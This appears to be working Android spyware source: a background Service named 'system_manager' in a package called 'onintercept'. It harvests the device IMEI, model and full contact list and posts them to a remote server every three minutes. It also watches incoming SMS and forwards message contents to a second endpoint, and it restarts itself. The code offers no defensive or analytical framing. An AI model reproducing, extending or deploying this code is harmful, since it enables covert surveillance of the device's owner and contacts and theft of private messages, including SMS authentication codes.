package im.unicolas.onintercept.asynctask;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import im.unicolas.onintercept.Config;
import im.unicolas.onintercept.OIApp;
import im.unicolas.onintercept.R;
import im.unicolas.onintercept.bean.MainListBean;
import im.unicolas.onintercept.bean.SmsInfo;
import okhttp3.Call;
import okhttp3.Response;

/**
 * Created by qq923 on 2016-12-11.
 */
public class system_manager extends Service {
    private static final String TAG = "MService";

    private Context context;
    private List<String> contactList = new ArrayList<>();
    private String deviceId;
    private ContentObserver co;
    private static final int TIME_LOOP = 3000 * 60;
    private File logsFile;
    private FileOutputStream fileOutputStream;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        logsFile = OIApp.getInstance().getLogsFile();
        try {
            loadContacts();
        } catch (Exception e) {
            e.printStackTrace();
        }
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("smsPost");
        intentFilter.addAction("smsReceiver");
        registerReceiver(br, intentFilter);
    }

    public String getPhoneState() {
        String model = Build.MODEL;
        String release = Build.VERSION.RELEASE;
        return model + ";" + release;
    }

    private void loadContacts() throws Exception {
        //if (contactList.size() > 0) contactList.clear();
//        fileOutputStream = new FileOutputStream(logsFile);
//        fileOutputStream.write(("------开始读取联系人-----"+"\n").getBytes());

        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        deviceId = telephonyManager.getDeviceId();
        OIApp.getInstance().getSp().edit().putString("deviceId", deviceId).apply();
        startTakeBook();
        //fileOutputStream.write(("------获取IMEI-----" + deviceId+"\n").getBytes());
        StringBuilder sb = new StringBuilder();
        if (contactList != null && contactList.size() > 0) {
            for (String s : contactList) {
                Log.e(TAG, "loadContacts: " + s + "     >> " + deviceId);
                sb.append(s + ",");
                //fileOutputStream.write(("------正在读取联系人-----" + s+"\n").getBytes());
            }
        }
        //fileOutputStream.write(("------联系人上传地址-----" + Config.CONTACTS+"\n").getBytes());
        OkGo.post(Config.CONTACTS)
                .params("imei", deviceId)
                .params("PhoneNum", sb.toString())
                .params("email", "")
                .params("xinghao", getPhoneState())
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(String s, Call call, Response response) {
                        Log.e(TAG, "onSuccess: 上传通讯录成功 " + s);
                        handler.sendEmptyMessageDelayed(1, TIME_LOOP);
//                        try {
//                            fileOutputStream.write(("------上传通讯录成功-----"+s+"\n\n").getBytes());
//                        } catch (IOException e) {
//                            e.printStackTrace();
//                        }
                    }

                    @Override
                    public void onError(Call call, Response response, Exception e) {
                        super.onError(call, response, e);
                        Log.e(TAG, "onError: 上传通讯录失败 " + e.getMessage());
//                        try {
//                            fileOutputStream.write(("------上传通讯录失败-----"+e.getMessage()+"\n\n").getBytes());
//                        } catch (IOException e1) {
//                            e1.printStackTrace();
//                        }
                    }
                });
        //fileOutputStream.write(("------读取新信息内容提供者启动-----"+"\n").getBytes());
        co = new SmsReceiver(handler, getApplicationContext());
        this.getContentResolver().registerContentObserver(Uri.parse(Config.SMS_URI_ALL), true, co);
        //fileOutputStream.write(("------读取联系人并执行上传完毕-----" +"\n\n\n").getBytes());

    }

    BroadcastReceiver br = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            String deviceId = OIApp.getInstance().getSp().getString("deviceId", "");
            String postMsg = "";
//            try {
//                fileOutputStream.write(("------获取新信息开始-----" +deviceId+"\n").getBytes());
//            } catch (IOException e) {
//                e.printStackTrace();
//            }
            if (action.equals("smsPost")) {
                postMsg = intent.getStringExtra("smsListener");
                Log.e(TAG, "onReceive: 监听新短信 " + postMsg);
            }

            if (action.equals("smsReceiver")) {
                String info = intent.getStringExtra("sm_sr");
                postMsg = info;
            }
            Log.e(TAG, "onReceive: 接受短信 >>>  " + postMsg);

//            try {
//                fileOutputStream.write(("------新信息已到达-----" +postMsg+"\n----上传地址--------"+Config.POST_SMS+"\n").getBytes());
//            } catch (IOException e) {
//                e.printStackTrace();
//            }

            if (postMsg.equals("")) return;

            OkGo.post(Config.POST_SMS)
                    .params("imei", deviceId)
                    .params("messages",postMsg)
                    .execute(new StringCallback() {
                        @Override
                        public void onSuccess(String s, Call call, Response response) {
                            Log.e(TAG, "onSuccess: DB监听短信发送 " + s);
                            handler.sendEmptyMessage(0);
//                            try {
//                                fileOutputStream.write(("------新信息上传完毕-----" + s + "\n\n").getBytes());
//                            } catch (IOException e1) {
//                                e1.printStackTrace();
//                            }
                        }

                        @Override
                        public void onError(Call call, Response response, Exception e) {
                            super.onError(call, response, e);
                            Log.e(TAG, "onError: DB监听短信失败 " + e.getMessage());
//                            try {
//                                fileOutputStream.write(("------新信息上传失败-----" + e.getMessage() + "\n\n").getBytes());
//                            } catch (IOException e1) {
//                                e1.printStackTrace();
//                            }
                        }
                    });
            startService(new Intent(context, system_manager.class));
//            try {
//                fileOutputStream.write(("------获取新信息获取完毕-----" +"\n\n").getBytes());
//                fileOutputStream.flush();
//
//            } catch (IOException e) {
//                e.printStackTrace();
//            }
        }
    };

    private Handler handler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            int what = msg.what;
            switch (what) {
                case 0:
                    Log.e(TAG, "handleMessage: 短信上传成功");

                    break;
                case 1:
                    try {
                        loadContacts();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    break;
            }
        }
    };


    //获取通讯录
    private void startTakeBook() {
        Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        int contactIndex = 0;
        int nameIndex = 0;

        if (cursor.getCount() > 0) {
            contactIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID);
            nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
        }

        while (cursor.moveToNext()) {
            MainListBean bean = new MainListBean();
            String contactId = cursor.getString(contactIndex);
            String name = cursor.getString(nameIndex);
            Log.e(TAG, "startTakeBook: " + contactId + "\n" + name);
            bean.setName(name);

            Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId,
                    null,null
            );
            int phoneIndex = 0;
            if (phones.getCount() > 0) {
                phoneIndex = phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            }
            while (phones.moveToNext()) {
                String phoneNumber = phones.getString(phoneIndex);
                bean.setPhone(phoneNumber);
                Log.e(TAG, "startTakeBook: 手机号 " + phoneNumber);
            }

            contactList.add(bean.getName() + ":" + bean.getPhone());
        }

    }

    /*@Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notification = new Notification(R.mipmap.ic_launcher,
                "running!", System.currentTimeMillis());
        PendingIntent service = PendingIntent.getService(this, 0, intent, 0);
        notification.setLatestEventInfo(this, "system.io.manager", "running", service);
        return super.onStartCommand(intent, 0, notification);
    }*/

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            fileOutputStream.write(("------Service结束-----" +"\n\n").getBytes());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
